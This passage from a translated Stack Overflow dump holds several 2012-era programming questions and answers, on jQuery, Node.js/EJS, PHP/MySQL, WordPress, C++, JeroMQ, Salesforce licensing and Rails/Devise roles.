}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T19:04:08.363

这应该有效：

```
$('.block').click(function() {
    $('.selected').removeClass('selected')
    $(this).addClass('selected');
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-04T19:04:20.523

我的方法是在单击时取消选择所有其他 div，然后切换单击的 div（也允许取消选择）：

```
​$('.block').click(function() {
    $('.block').not($(this)).removeClass('selectable');
    $(this).toggleClass('selectable');
});​​​​​ 
```

更新[了 FIDDLE](http://jsfiddle.net/3PEqC/7/)。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-04T18:59:49.397

代码非常简单。

```
$('.block').click(function() {
  $(this).toggleClass('selected'); // if it has the class, it will take it away, if it doesn't have it, it will add it.
}); 
```

# ios - 删除第一个 Annotation-MapView iOS

> ID：13221757
> 
> 赞同：0
> 
> 时间：2012-11-04T18:58:06.450
> 
> 标签：ios, mkmapview

我正在研究地图视图项目。我有关于从 mapView 中删除注释的问题。我已经实现了以下代码，但它随机删除了注释，而不是第一个！

```
[mapView removeAnnotation:[self.mapView.annotations objectAtIndex:0]]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:37:23.217

`self.mapView.annotations`为您提供所有注释的 NSArray，但它不保证每次都以相同的顺序排列，也不保证您添加注释的顺序。您将不得不找到另一种方法来获取对您打算删除的引用的引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T19:46:50.167

我遇到了一个解决方案。谁关心这个问题的答案，你去

我创建了一个 NSMUtable 数组并将所有对象添加到数组中，然后从地图视图中删除第一个元素

```
 [mapView removeAnnotation:[annotationArray objectAtIndex:0]]; 
```

# salesforce - 了解用于开发和部署的 Salesforce 许可

> ID：13221759
> 
> 赞同：3
> 
> 时间：2012-11-04T18:58:20.037
> 
> 标签：salesforce, crm

我试图了解我会在 Force.com 上遇到的许可问题，以开发具有自己的数据源并且还将通过 api/service 从 SalesForce.com 提取数据的应用程序。我花了一天多的时间从各个站点对此进行研究，但其中大多数都不断抛出新事物，这些事物并不能真正回答我的问题，并且让我更加困惑。如果这里的任何人对此有任何见解，可以帮助我了解使用 Force.com 开发和维护网站的成本，那么我可以将其与在 .Net 或 Java 上构建应用程序并将其托管在不同的云上进行比较供应商，那么请帮助我。我的问题是：

1.  如果我有 5 名开发人员使用 Force.com 平台开发一个名为 XYZ 的应用程序，我需要为此类开发工作购买多少个 Force.Com 许可证，这些许可证应该是什么类型的？
2.  如果这些开发人员需要通过在 Force.com 上编写的代码从 SalesForce 数据库获取数据，我是否还需要购买单独的 SalesForce 许可证？
3.  如果我已经拥有 SalesForce 许可证，那么如果我将该许可证转换为访问 Force.com 以进行开发工作，我对 SalesForce 的访问权限会被暂停吗？
4.  我可以在以后的测试阶段重复使用这些相同的许可证，还是应该购买单独的许可证进行测试？
5.  一旦开发完成并且人们在我的 XYZ Web 应用程序上为自己创建帐户，他们是否需要 Salesforce 登录才能从公司网络访问与 salesforce 相关的数据，或者他们仍然可以在没有的情况下访问它吗？
6.  如果我的 XYZ Web 应用程序不访问 SalesForce 的数据，那么我的 XYZ Web 应用程序的用户是否仍需要 salesforce 或 Force.com 许可证才能登录 XYZ？
7.  如果我不使用 Force.com 作为我的开发平台，并且我仍然需要访问 SalesForce 数据，我需要拥有多少许可证？每个登录在我的 XYZ 应用程序上创建一个，还是只创建一个？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T22:02:57.523

您最好在[salesforce.stackexchange.com](http://salesforce.stackexchange.com)（测试版）上询问这个问题。似乎有很多专家已经完成了一些很酷的集成、托管包等，甚至是[ISV](http://www.salesforce.com/partners/isv/)。所以他们可能在这件事上有更多的经验。他们甚至可能会将您指向 database.com。

或者只是去和 SF 销售代表谈谈。

此外，我认为您不明白您不只是“购买 Salesforce 许可证”。您购买绑定到特定生产组织的许可证（如果您愿意，可以购买一个实例）。您无法在组织之间传输它们，并且您的 Web 应用程序将与特定 Salesforce 实例通信这一事实并不意味着您可以使用相同的许可证也连接到不同的实例。所以如果这就是你的意思

> 我花了一天多的时间从各个站点对此进行研究，但其中大多数都不断抛出新事物，这些事物并不能真正回答我的问题，并且让我更加困惑。

那你会很难过...

我认为对于这样的问题，您最终需要询问您的律师，不要相信互联网上的人 :) 安全港，等等等等，不要起诉我......

1.  要开始开发，您无需支付任何费用。注册[开发者版](http://www.developerforce.com/events/regular/registration.php)并破解。（每个开发人员都可以做到，您可以使用 SVN 等在他们之间进行同步——这对于快速入门来说绝对足够了）。如果您已经有一个“生产”（例如企业版“），那么我认为每个活动用户最多允许同时登录 4 个。这适用于不同的渠道（例如，开发人员既会点击应用程序的 UI 并在其中工作） Eclipse IDE 计为 2)，因此您可以尝试在此处削减成本……但我建议您使用 5 个完整的 Salesforce 许可证。
2.  不，就足够了。
3.  我不认为您可以转换许可证；）您只需购买不同类型的许可证并与他们联系以减少您不需要的许可证类型的数量。您可以通过为他们分配不同类型的许可证来转换用户（这可能会导致配置文件的更改）。因此，例如，您将完整的系统管理员（在 Salesforce 许可证上）降级为只能看到 Chatter 并失去对帐户等的访问权限的用户。
4.  您可以使用相同的许可证。甚至可以说停用开发人员用户帐户并使用释放的许可证来创建一些测试用户。
5.  取决于您想要使用多少 SF 功能（在数据所有权、可见性等方面）。您必须在 Salesforce 中提供活动用户的“一些”凭据。因此，您可能只需要 1 个“集成用户”帐户来查看所有数据，然后在您的 web 应用程序上执行所有过滤等操作。
6.  我不明白那个，所以我会说“不”；）如果您不需要连接到 SF 并获取数据 - 不是吗？除非您在那里有某种单点登录解决方案。
7.  如果您需要从外部应用程序访问 Salesforce，您需要进行身份验证。用户名 + 密码、Oauth、sessionId、单点登录……无论如何——SF 需要一些东西来说明这个用户是活跃的，他可以看到这个数据。所以它有点回到答案＃5。

# node.js - Nodejs EJS 辅助函数？

> ID：13221760
> 
> 赞同：31
> 
> 时间：2012-11-04T18:58:22.663
> 
> 标签：node.js, express, ejs

有没有办法将辅助函数注册到 EJS 模板，以便可以从任何 EJS 模板调用它们？所以，它应该像这样工作。

应用程序.js

```
ejs.helpers.sayHi = function(name) {
    return 'Hello ' + name;
}); 
```

索引.ejs

```
<%= sayHi('Bob') %> 
```

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-04-19T06:08:00.270

是的，在 Express 3 中，您可以将助手添加到`app.locals`. 前任：

```
app.locals.somevar = "hello world";

app.locals.someHelper = function(name) {
  return ("hello " + name);
} 
```

这些可以在您的视图中访问，如下所示：

```
<% somevar %>

<% someHelper('world') %> 
```

注意：Express 2.5 使用不同的助手。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-08-29T01:42:10.400

我对此有另一种解决方案，我认为它有一些优点：

*   不要污染您的代码导出过滤器。
*   无需全部导出即可访问任何方法。
*   更好的 ejs 使用（无 | 管道）。

在您的控制器上：

```
exports.index = function(req, res) {
// send your function to ejs
    res.render('index', { sayHi: sayHi });
}

function sayHi(name) {
    return 'Hello ' + name;
}; 
```

现在你可以在你的 ejs 中使用 sayHi 函数了：

```
<html>
    <h1><%= sayHi('Nice Monkey!') %></h1>
</html> 
```

您可以使用此方法将模块发送到 ejs，例如，您可以发送 'moment' 模块来格式化或解析日期。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-04T23:49:51.720

这是一个示例过滤器......我不熟悉助手。

```
var ejs = require('ejs');

ejs.filters.pluralize = function(num, str){
    return num == 1 ? str : str+'s';
};

 <%=: items.length | pluralize:'Item' %> 
```

如果它为 1，将产生“Item”，或者如果 0 或 > 1，则产生“Items”

应用程序.js

```
ejs.filters.sayHi = function(name) {
    return 'Hello ' + name;
}); 
```

索引.ejs

```
<%=: 'Bob' |  sayHi %> 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-11-16T05:45:37.773

我在用：

在 helpers/helper.js

```
var func = {
    sayhi: function(name) {
        return "Hello " + name;
    }, 
    foo: function(date) {
        //do somethings
    }    
};
module.exports = func; 
```

在路由器中：

```
router.get('/', function(req, res, next) {
    res.render('home/index', {
        helper: require('../helpers/helper'),
        title: 'Express'
    });
}); 
```

在模板中：

```
<%= helper.sayhi("Dung Vu") %> 
```

祝你好运

# php - 我无法让 INSERT INTO 使用 php

> ID：13221762
> 
> 赞同：0
> 
> 时间：2012-11-04T18:58:59.340
> 
> 标签：php, sql

我真的不知道我做错了什么。所有其他查询（SELECT 查询）都可以正常工作，但这似乎不起作用。有任何想法吗？

```
<?php
session_start();
$host="*******"; // Host name 
$username="*******"; // Mysql username 
$password="*******"; // Mysql password 
$db_name="*******"; // Database name 
$from = $_GET['from'];
$to = $_GET['to'];

// Connect to server and select databse.
$con = mysql_connect("$host", "$username", "$password")or die("cannot connect"); 
mysql_select_db("$db_name",$con)or die("cannot select DB");

mysql_query("INSERT INTO message('from', 'to', 'message', 'confirm') VALUES (2,3,'would like to add you as a friend',1)");

echo'The request has been sent.'; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T19:02:39.040

您需要对名为“from”和“to”的列进行反引号转义，或者将该列重命名为非保留字。这会让你和其他任何人永远在屁股上查询这张桌子，所以我倾向于重命名。

```
`from`, `to` 
```

请向众神保证，您将永远不会再命名列或 db mysql 保留字。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-04T19:03:55.873

您正在使用保留字 from, to 作为您的字段名称。用反引号而不是引号转义它们。

```
 mysql_query("INSERT INTO message(`from`, `to`, `message`, `confirm`) VALUES (2,3,'would like to add you as a friend',1)"); 
```

[在此处](https://dev.mysql.com/doc/refman/5.5/en/reserved-words.html)查看 MySQL 保留字的完整列表

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T19:01:33.017

根据经验，在查询结束时始终使用内置函数`or die(mysql_error());`，这将以明文形式输出查询中的实际问题，所以在此之前，您可以自定义它。在这种情况下，将您的代码更改为

```
mysql_query("INSERT INTO message('from', 'to', 'message', 'confirm') VALUES (2,3,'would like to add you as a friend',1)") or die(mysql_error()); 
```

而这些：

```
$con = mysql_connect("$host", "$username", "$password")or die(mysql_error()); 
 mysql_select_db("$db_name",$con)or die(mysql_error()); 
```

然后，您将看到问题所在。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-04T19:02:11.363

检查某列消息是否有唯一索引。

# php - 创建内容分级脚本

> ID：13221766
> 
> 赞同：-1
> 
> 时间：2012-11-04T18:59:20.430
> 
> 标签：php, wordpress, rating, article

我正在尝试编写一个内容评级脚本，用户可以在其中选择对他们的文章进行评级的类型（例如，文章适合哪个年龄段）。

我正在使用 Wordpress 星级评分脚本作为模板。

这部分脚本是用户选择评级的地方：

```
function pn_apr_meta_box_form( $post )
{   
    wp_nonce_field( 'pn_apr_meta_box_nonce', 'pn_apr_meta_box_nonce_field' );

    $current_post_rating = get_post_meta( $post->ID, PN_APR_RATING_META_KEY, true );

    echo '<label for="pn_apr_rating">' . __( 'Choose a rating for this post:', 'author-post-ratings' ) . '</label> ';
    echo '<select name="pn_apr_rating" id="pn_apr_rating">';
    echo '<option value="unrated"' . selected( $current_post_rating, 0, false ) . '>' . __( 'Unrated', 'author-post-ratings' ) . '</option>';
    for ( $i = 1; $i <= 5; $i++ ) {
        echo '<option value="' . $i . '"' . selected( $current_post_rating, $i, false ) . '>' . sprintf( _n( '%1s Star', '%1s Stars', $i, 'author-post-ratings' ), $i ) . '</option>';
    }
    echo '</select>';
} 
```

这部分脚本输出评分：

```
if ( $rating ) {

    $output = null;

    $output .= '<div class="author-post-rating">';

    $output .= '<span class="author-post-rating-label">' . esc_attr( $pn_apr_settings['label_text'] ) . '</span> ';

    $output .= '<span class="author-post-rating-stars" title="' . sprintf( __( '%1$d out of %2$d stars', 'author-post-ratings' ), $rating, 5 ) . '">';

    // Output active stars
    for ( $i = 1; $i <= $rating; $i++ ) {

        $output .= '<img src="' . PN_APR_PLUGIN_DIR_URL . 'images/star-active.png" />';

    }

    // Output inactive stars
    for ( $i = $rating + 1; $i <= 5; $i++ ) {

        $output .= '<img src="' . PN_APR_PLUGIN_DIR_URL . 'images/star-inactive.png" />';

    }

    $output .= '</span>' . "\n";

    $output .= '</div><!-- .author-post-rating -->';

    if ( true == $return ) { return $output; }

    // We don't need to use "else" here, since calling return will automatically stop further execution of this function.
    echo $output;

} 
```

现在，我想更改此脚本，使其成为内容评级脚本（而不是星级）。我想为用户提供这些选择：

> G——适合所有观众
> 
> PG — 可能具有攻击性，通常针对 13 岁及以上的观众
> 
> R - 适用于 17 岁以上的成人观众
> 
> X——比上面更成熟

问题：如何更改脚本，以便如果用户选择例如`PG`，那么它将输出文本`Suitable for age 13 and up`。

编辑：

对于 Shawn，请观察以下代码：

```
function rating_select_cb( $post ) {
    global $wpdb;
    $value = get_post_meta($post->ID, 'rating', true);
    echo '<div class="misc-pub-section misc-pub-section-last"><span id="timestamp"><label>Select a rating:<br></label>';

    // build an array of each available rating
    $ratings = array(
        1 => 'G — Suitable for all audiences',
        2 => 'PG — Possibly offensive, usually for audiences 13 and above',
        3 => 'R — Intended for adult audiences above 17',
        4 => 'X — Even more mature than above'
    );

    echo '<select name="rating">';
    echo '<option value=""' . ((($value == '') || !isset($ratings[$value])) ? ' selected="selected"' : '') . '> None... </option>';

    // output each rating as an option
    foreach ($ratings as $id => $text) {
        echo '<option value="' . $id . '"' . (($value == $id) ? ' selected="selected"' : '') . '">' . $text. '</option>';
    }
    echo '</select>';

    echo '</span></div>';
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:33:47.120

这里有一些东西可以让你到达你需要的地方：

添加到您的functions.php：

```
add_action( 'add_meta_boxes', 'rating_select_box' );
function rating_select_box() {
    add_meta_box(
        'rating_select_box', // id, used as the html id att
        __( 'Select rating:' ), // meta box title, like "Page Attributes"
        'rating_select_cb', // callback function, spits out the content
        'post', // post type or page. We'll add this to posts only
        'side', // context (where on the screen
        'low' // priority, where should this go in the context?
    );

}

function rating_select_cb( $post )
{
    global $wpdb;
    $value = get_post_meta($post->ID, 'rating', true);
    echo '<div class="misc-pub-section misc-pub-section-last">
         <span id="timestamp">'
         . '<label>Select a rating:<br></label>';

         $selected = ($value == $result->post_name) ? ' selected="selected" ' : null;

         echo '<select name="rating">';
         echo '<option value="" default="default"> None... </option>';
         echo '<option value="0" '.$selected.'> G — Suitable for all audiences </option>';
         echo '<option value="1" '.$selected.'> PG — Possibly offensive, usually for audiences 13 and above </option>';
         echo '<option value="2" '.$selected.'> R — Intended for adult audiences above 17 </option>';
         echo '<option value="3" '.$selected.'> X — Even more mature than above </option>';
         echo '</select>';      

    echo '</span></div>';
}

add_action( 'save_post', 'save_metadata');

function save_metadata($postid)
{   
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) return false;
    if ( !current_user_can( 'edit_page', $postid ) ) return false;
    if( empty($postid) ) return false;

    if ( is_null($_REQUEST["rating"]) ) {
        delete_post_meta($postid, 'rating');
    } else {
        update_post_meta($postid, 'rating', $_REQUEST['rating']);
    }

} 
```

上面的代码是这样的： 1\. 向你的帖子添加一个新的元框 2\. 添加一个带有评分值的选择框 3\. 保存帖子的元数据

**要访问模板中的元数据：**

```
$meta = get_post_custom($post->ID);
echo $meta['rating'][0]; 
```

**要让您的模板显示自定义字符串，请使用以下内容：**

```
switch ( $meta['rating'][0] ) {
    case 0:
        echo "This is rated PG";
        break;
    case 1:
        echo "This is rated G";
        break;
    case 2:
        echo "This is rated R";
        break;
    case 3:
        echo "Ug oh! This is rated X!";
        break;
    default:
        echo "This is not yet rated.";
} 
```

**编辑：此代码提供完整的功能.. 如果它适合您，您可以放弃当前的解决方案

# javascript - Node.JS：如何将变量传递给异步回调？

> ID：13221769
> 
> 赞同：46
> 
> 时间：2012-11-04T18:59:48.757
> 
> 标签：javascript, node.js, asynchronous, web-crawler

我确定我的问题是基于对 node.js 中的异步编程缺乏了解，但这里有。

例如：我有一个要抓取的链接列表。当每个异步请求返回时，我想知道它用于哪个 URL。但是，大概是因为竞态条件，每个请求返回的 URL 都设置为列表中的最后一个值。

```
var links = ['http://google.com', 'http://yahoo.com'];
for (link in links) {
    var url = links[link];
    require('request')(url, function() {
        console.log(url);
    });
} 
```

预期输出：

```
http://google.com
http://yahoo.com 
```

实际输出：

```
http://yahoo.com
http://yahoo.com 
```

所以我的问题是：

1.  如何将 url（按值）传递给回调函数？或者
2.  链接 HTTP 请求以便它们按顺序运行的正确方法是什么？或者
3.  我还缺少什么？

PS：对于 1\. 我不想要一个检查回调参数的解决方案，而是一种通用的回调方法，它知道“从上面”的变量。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-11-04T19:11:16.993

您的`url`变量不限于`for`循环，因为 JavaScript 仅支持全局和函数范围。因此，您需要为调用创建一个函数范围，以使用立即函数`request`捕获循环的每次迭代中的值：`url`

```
var links = ['http://google.com', 'http://yahoo.com'];
for (link in links) {
    (function(url) {
        require('request')(url, function() {
            console.log(url);
        });
    })(links[link]);
} 
```

顺便说一句，在循环中间嵌入 a`require`不是好的做法。它可能应该重写为：

```
var request = require('request');
var links = ['http://google.com', 'http://yahoo.com'];
for (link in links) {
    (function(url) {
        request(url, function() {
            console.log(url);
        });
    })(links[link]);
} 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2016-05-01T20:50:19.963

看看这个[博客](http://samwize.com/2013/09/01/how-you-can-pass-a-variable-into-callback-function-in-node-dot-js/)。可以使用 .bind() 方法传递变量。在你的情况下，它会是这样的：

```
var links = ['http://google.com', 'http://yahoo.com'];
for (link in links) {
var url = links[link];

require('request')(url, function() {

    console.log(this.urlAsy);

}.bind({urlAsy:url}));
} 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-11-04T19:15:43.977

有关此问题的一般讨论，请参阅[https://stackoverflow.com/a/11747331/243639](https://stackoverflow.com/a/11747331/243639)。

我建议像

```
var links = ['http://google.com', 'http://yahoo.com'];

function createCallback(_url) {
    return function() {
        console.log(_url);
    }
};

for (link in links) {
    var url = links[link];
    require('request')(url, createCallback(url));
} 
```

# c++ - 为什么这个程序不打印出十六进制值？

> ID：13221774
> 
> 赞同：1
> 
> 时间：2012-11-04T18:59:56.983
> 
> 标签：c++

我已经很久没有接触 C++ 了，而且我的语言从来都不是很流利，所以请原谅我的无知。

我编写了以下小程序来处理 XOR 加密：

```
#include <iostream>
#include <iomanip>
#include "string.h"

using std::cout;
using std::endl;
using std::hex;
using std::string;

string cipher(string msg, char key);

int main(void)
{
    string msg = "Now is the winter of our discontent, made glorious summer by this sun of York.";
    char key = 's';  // ASCII 115

    string ctext = cipher(msg, key);

    cout << "Plaintext:  " << msg << endl;
    cout << "Ciphertext (hex):  ";
    for (int i = 0; i < ctext.size(); i++)
        cout << hex << ctext[i];

    return 0;
}

string cipher(string msg, char key)
/*
    Symmetric XOR cipher
*/
{
    for(int i = 0; i < msg.size(); i++)
        msg[i] ^= key;

    return msg;
} 
```

此代码输出以下内容：

```
Plaintext:  Now is the winter of our discontent, made glorious summer by this sun of York.
Ciphertext (hex):  =SSSSSS_SSSS
SSSS*] 
```

为什么我不能输出十六进制值？我究竟做错了什么？

此外，任何一般性建议都值得赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:01:59.883

十六进制适用于整数。无论流中设置了什么基数，char 都作为字符流式传输。如果要以十六进制打印字符的 ACSII 代码，请使用

```
 cout << hex << static_cast<int>(ctext[i]); 
```

# messaging - JeroMq 丢弃消息——如何防止？

> ID：13221776
> 
> 赞同：1
> 
> 时间：2012-11-04T18:59:59.070
> 
> 标签：messaging, zeromq, jeromq

我有以下“hello world” [jeromq](https://github.com/zeromq/jeromq) PUSH-PULL 客户端和服务器。只有在我设置了高水位标记值之后，我才能在不丢失消息的情况下进行传输。

```
import org.jeromq.ZMQ;

    public class TestTcpServer {

    public static void main(String[] args) {

    ZMQ.Context context = ZMQ.context(1);
    ZMQ.Socket socket = context.socket(ZMQ.PULL);

    System.out.println("Binding TCP server on port 5555");

    //socket.setRcvHWM(100_000);

    socket.bind("tcp://*:5555");
    int x;
    x = 0;
    while (true) {
        x++;
        byte[] raw = socket.recv(0);
        String rawMessage = new String(raw);
        if (x > 99_997) {
            System.out.println(x);
            System.out.println(rawMessage);
        }
    }

    }

}

//client

import java.io.IOException;
import org.jeromq.ZMQ;

public class TestTcpClient {

/**
 * @param args
 * @throws InterruptedException
 * @throws IOException
 */
public static void main(String[] args) throws InterruptedException,
        IOException {
    ZMQ.Context context = ZMQ.context(1);
    ZMQ.Socket socket = context.socket(ZMQ.PUSH);
    socket.connect("tcp://localhost:5555");

    //socket.setRcvHWM(100_000);

    System.out.println("Sending 100 000 transactions over TCP...");                   long start = System.currentTimeMillis();

    for (int request_nbr = 0; request_nbr != 100_000; request_nbr++) {
        String requestString = "message";
        byte[] request = requestString.getBytes();
        boolean success = socket.send(request, 0);
        if (!success) {
            System.out.println("sending message failed!");
        }

    }
    long end = System.currentTimeMillis();
    System.out.print("Time: ");
    System.out.print(end - start);
    System.out.println(" ms");      
    socket.close();
    context.term();     
}

} 
```

根据 0Mq[文档](http://zguide.zeromq.org/page%3aall#High-Water-Marks)，当达到高水位线时，只有 PUB 套接字会丢弃消息。由于我使用的是 PUSH-PULL 套接字，为什么会丢弃消息？

在我看来，HWM 是系统的动态属性，所以虽然我已经能够解决在这个 hello world 示例中丢弃消息的问题，但我想知道我是否可以指望 jeromq 在现实世界的情况下不会丢弃消息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T14:01:13.007

感谢您的报告。

是的，PUSH/PULL 不能丢弃消息。

*ZMTP 2.0*支持的最新飞跃存在一个错误。

请尝试使用最新的快照。

另外，我建议您`socket.setLinger(some_milli_seconds)`在发送消息后想要退出应用程序时在客户端添加。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-14T06:55:38.860

它在 JeroMQ 0.3 中应该可以正常工作，我在这里做了一个简单的基准测试[http://nguyentantrieu.info/blog/benchmark-pubsub-jeromq-java/](http://nguyentantrieu.info/blog/benchmark-pubsub-jeromq-java/)

# javascript - 如何使用 Jquery .animate() 函数创建连续滚动内容？

> ID：13221777
> 
> 赞同：6
> 
> 时间：2012-11-04T18:59:59.960
> 
> 标签：javascript, jquery, jquery-animate, marquee, scroller

> **可能重复：**
> [在 jquery 中实现循环滚动器](https://stackoverflow.com/questions/812049/implementing-circular-scroller-in-jquery)

我想创建垂直滚动条，它的工作方式与选取框完全一样。但我希望它是连续的，就像当我们使用 marquee 时，整个内容只有在它完全上升后才会回来，但我希望它是连续的。

这就是我所拥有的...... [http://jsfiddle.net/JWfaf/1/](http://jsfiddle.net/JWfaf/1/)

我只想要一个方向并继续滚动。我希望我已经清除了我想要实现的目标

HTML

```
<div class="con">
   <ul>
      <li></li>
      <li></li>
      <li></li>
       <li></li>
   </ul>
</div>​ 
```

JavaScript

```
function animatethis(targetElement, speed) {
$(targetElement).animate({ marginTop: "+=250px"},
{
    duration: speed,
    complete: function ()
    {
        targetElement.animate({ marginTop: "-=250px" },
        {
            duration: speed,
            complete: function ()
            {
                animatethis(targetElement, speed);
            }
        });
    }
});
};

animatethis($('.con ul li:first-child'), 10000);​ 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-04T19:49:38.427

工作演示：http: [//jsfiddle.net/rNXs9/1/](http://jsfiddle.net/rNXs9/1/)

HTML：

```
<div id="verticalScroller">
    <div>1 Lorem ipsum dolor sit</div>
    <div>2 Lorem ipsum dolor sit</div>
    <div>3 Lorem ipsum dolor sit</div>
    <div>4 Lorem ipsum dolor sit</div>
</div>
​ 
```

CSS：

```
#verticalScroller {
    position: absolute;
    width:52px;
    height: 180px;
    overflow: hidden;
}

#verticalScroller > div {
    position:absolute;
    width:50px;
    height:50px;
}
​ 
```

JS：

```
window.verticalScroller = function($elem) {
    var top = parseInt($elem.css("top"));
    var temp = -1 * $('#verticalScroller > div').height();
    if(top < temp) {
        top = $('#verticalScroller').height()
        $elem.css("top", top);
    }
    $elem.animate({ top: (parseInt(top)-60) }, 600, function () {
      window.verticalScroller($(this))
    });
}

$(document).ready(function() {
    var i = 0;
    $("#verticalScroller > div").each(function () {
          $(this).css("top", i);
          i += 60;
          window.verticalScroller($(this));
    });
});

​ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T19:16:16.163

[在这里](http://jsfiddle.net/howderek/yY5SP/)，您很好，先生。

## 编码

JS：

```
function animatethis(targetElement, speed) {
    $(targetElement).animate({ marginTop: "300px"},
    {
        duration: speed,
        complete: function ()
        {
            $(targetElement).css('marginTop','-450px');
            animatethis(targetElement, speed);
        }
    });
};

animatethis($('.con ul li:first-child'), 10000);​ 
```

CSS：

```
ul{display:block;width:110px;float:left;height:310px;background:#eee;overflow:hidden;}
li{display:block;width:100px;height:100px;background:#DDD;border-bottom:1px solid #FFF;margin-bottom:5px;}
.con{display:block;width:200px;height:300px;overflow:hidden;} 
```

HTML：

```
<a href="#" class="click">click</a>
<div class="con">
<ul>
        <li></li>
        <li></li>
        <li></li>
        <li></li>   
</ul></div>​ 
```

# windows-8 - 我是否必须处理所有输入类型才能通过 Windows 应用商店认证？

> ID：13221783
> 
> 赞同：0
> 
> 时间：2012-11-04T19:00:20.550
> 
> 标签：windows-8, windows-runtime, windows-store-apps

我有一个游戏要移植到 Windows 应用商店，但不幸的是，这种游戏类型在触摸输入上并不适用。我目前支持键盘、鼠标和游戏手柄，但我担心会因为我不处理触摸而被拒绝。

任何人都有这方面的经验或知道我可以在哪里看？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:16:17.890

在这里找到答案：[Windows 8 应用认证要求](http://msdn.microsoft.com/en-us/library/windows/apps/hh694083.aspx)

> 3.5 你的应用必须完全支持触摸输入，并且完全支持键盘和鼠标输入
> 
> 当用户触摸交互式元素时，您的应用程序必须提供视觉反馈。

这真是令人遗憾，因为现在我不确定如何将游戏发布到商店，而触摸输入则没有意义。

# c++ - 类未定义

> ID：13221784
> 
> 赞同：0
> 
> 时间：2012-11-04T19:00:22.423
> 
> 标签：c++

我有两个类，一个叫`Grocery`另一个叫`Strings`

在*Grocery.cpp 中*，我正在尝试使用“Strings”类中的一个名为：“copyString”的函数，但出现以下错误：

> 标识符“copyString”未定义

“字符串”类只是基本字符串函数的通用类，例如：strcmp、strcpy 等......

在“杂货”类中，我不想创建“字符串”对象，而是像在 C# 中使用“数学”类一样使用它。只需标明类名并使用点来调用该类的函数。

如何创建一个与上面描述的 C# 中的“数学”类具有相同功能的“字符串”类？

非常感谢！盖伊

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:05:14.403

要么你有一个`Strings`带有方法的类`getStringLength()`，在这种情况下你需要调用`getStringLength()`一个`Strings`实例：

```
Strings s = ....;
s.getStringLength(); 
```

或者您有一个`Strings`带有该方法的命名空间，在这种情况下，您需要像这样调用它：

```
Strings::getStringLength(); 
```

如果函数与类无关`Strings`，请考虑在合适的命名空间中将其设为非成员函数：

字符串.h：

```
namespace StringFunctions
{
  int getStringLength();
} 
```

字符串.cpp：

```
StringFunctions::getStringLength() { return 42; } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T19:04:27.387

从您的图像看来，您正在声明`getStringLength`（一个自由函数）并尝试使用它，但将函数定义为好像它是 type 的成员一样`Strings`。

会不会是你在`Strings::`不知道为什么的情况下写作？你不会因为文件被调用而写`Strings.cpp`。

自由（非成员）函数`Strings::`在其定义之前没有。从到目前为止你在评论中告诉我们的内容来看，我认为你唯一的错误是`Strings::`在你不应该写的时候写。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T19:04:06.307

1.  通常不应包含 .cpp 文件。
2.  您必须在要使用的文件中包含要使用的文件。

# ruby-on-rails - Rails，设计，acl

> ID：13221785
> 
> 赞同：0
> 
> 时间：2012-11-04T19:00:23.857
> 
> 标签：ruby-on-rails, ruby, devise, acl

我已经按照这个 tut [http://railsapps.github.com/tutorial-rails-bootstrap-devise-cancan.html](http://railsapps.github.com/tutorial-rails-bootstrap-devise-cancan.html)我想做这样的事情：

```
before_filter :authenticate_user!
before_filter :authenticate_VIP!
before_filter :authenticate_admin!
before_filter :authenticate_somerole! 
```

我有表：角色、用户、user_roles，我不想创建另一个表（rails g 设计 VIP 创建另一个表）。

我想要方法authenticate_ROLE。这该怎么做 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T20:10:12.830

我有三个表，Users、Roles 和 RoleRelationships（或 role_users，由你决定）

这是我的角色表：

```
class Role < ActiveRecord::Base
  attr_accessible :name
  has_many :role_relationships
  has_many :users, through: :role_relationships
end 
```

角色表将具有`name`角色列，例如：“admin”、“teacher”、“vip”（如您所愿）。

这是用户表：

```
class User < ActiveRecord::Base
  devise ...
  has_many :role_relationships
  has_many :roles, through: :role_relationships
end 
```

和我的 RoleRelationship 表：

```
class RoleRelationship < ActiveRecord::Base
  attr_protected :role_id, :user_id

  belongs_to :user
  belongs_to :role
end 
```

我设置了我的应用程序一个用户可以有很多角色，你可以设置自己的方式。所以，我有一个`role?(role)`方法`user.rb`，如下所示：

```
def role?(role)
  return role == RoleRelationship.find_by_user_id(self.id).role.name
end 
```

然后在我的`abilities`文件中，我定义了用户的能力：

```
def initialize(user)

  user ||= User.new # guest user

  if user.role? "teacher"
        can :read, Course
        can :manage, Topic, user_id: user.id
        can :create, Topic
  else  user.role? "admin"
        can :manage, Course
  end 
```

所以，`teacher`只会读取`Course`，并且`admin`可以 CRUD `Course`。为此，我`load_and_authorize_resource`在 CoursesController 中使用方法：

```
class CoursesController < ApplicationController

  load_and_authorize_resource

